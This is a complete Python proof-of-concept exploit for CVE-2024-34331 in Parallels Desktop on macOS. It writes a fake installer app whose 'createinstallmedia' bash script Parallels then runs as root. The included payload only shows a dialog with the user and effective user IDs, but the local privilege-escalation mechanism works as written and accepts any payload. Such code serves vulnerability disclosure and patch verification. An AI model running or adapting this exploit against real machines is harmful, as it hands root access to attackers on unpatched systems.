"""
exploit.py: Create faux macOS installer to trick Parallels into
            running 'createinstallmedia' with root privileges.
---------------------------------------------------------------

CVE-2024-34331 - Discovered by Mykola Grymalyuk

---------------------------------------------------------------
"""

import plistlib
import subprocess

from pathlib import Path


class InstallerExploit:
    """
    Note we don't create a new tmp directory as we'll exit before Parallels can run the exploit.
    """
    def __init__(self, installer_name: str = "Install macOS Exploit", installer_directory: str = "/tmp") -> None:
        self._installer_name      = installer_name
        self._installer_directory = installer_directory


    def _generate_bash_script(self) -> str:
        """
        Generate bash script to demonstrate the exploit.

        Simply displays the following through AppleScript:
        - Current user (whoami)
        - User ID (UID)
        - Effective user ID (EUID)
        """
        return "\n".join([
            "#!/bin/bash",
            """/usr/bin/osascript -e "display dialog \\"Hello from malware!\n\nCurrent user: $(whoami)\nUID:  $UID\nEUID: $EUID\\"" """,
        ])


    def _generate_info_plist(self) -> dict:
        """
        Generate info.plist for faux installer
        """
        return {"CFBundleDisplayName": "createinstallmedia"}


    def create_installer(self) -> None:
        """
        Create faux macOS installer to trick Parallels into running 'createinstallmedia' with root privileges.
        """
        installer_directory = Path(self._installer_directory) / f"{self._installer_name}.app"

        print(f"Creating installer at {installer_directory}")
        if Path(installer_directory).exists():
            subprocess.run(["/bin/rm", "-rf", installer_directory])

        print(f"Creating 'createinstallmedia' exploit")
        cim_path = Path(installer_directory) / "Contents/Resources/createinstallmedia"
        cim_path.parent.mkdir(parents=True, exist_ok=True)
        with open(cim_path, "w") as cim_file:
            cim_file.write(self._generate_bash_script())
        cim_path.chmod(0o755)

        # Create Info.plist
        info_plist_path = Path(installer_directory) / "Contents/Info.plist"
        with open(info_plist_path, "wb") as info_plist_file:
            plistlib.dump(self._generate_info_plist(), info_plist_file)


    def trigger_exploit(self) -> None:
        """
        Have Parallels open exploited app
        """
        print("Exploiting Parallels Desktop with crafted macOS installer")
        subprocess.run(["/usr/bin/open", f"{self._installer_directory}/{self._installer_name}.app", "-a", "/Applications/Parallels Desktop.app"])


if __name__ == "__main__":
    exploit = InstallerExploit()
    exploit.create_installer()
    exploit.trigger_exploit()